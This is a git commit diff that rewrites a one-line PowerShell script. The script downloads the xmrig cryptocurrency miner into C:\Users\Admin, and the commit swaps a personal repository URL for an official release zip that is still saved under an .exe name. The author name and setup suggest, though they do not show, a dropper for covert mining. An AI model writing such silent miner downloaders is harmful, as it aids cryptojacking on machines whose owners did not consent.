313d12944fda466efdf72a4cd484c65a26c67476
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-28 15:58:01 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("https://github.com/ExploitGF/mine/raw/master/xmrig.exe","C:\Users\Admin\xmrig.exe")
+(New-Object System.Net.WebClient).DownloadFile("https://github.com/xmrig/xmrig/releases/download/v2.6.4/xmrig-2.6.4-gcc-win64.zip","C:\Users\Admin\xmrig.exe")
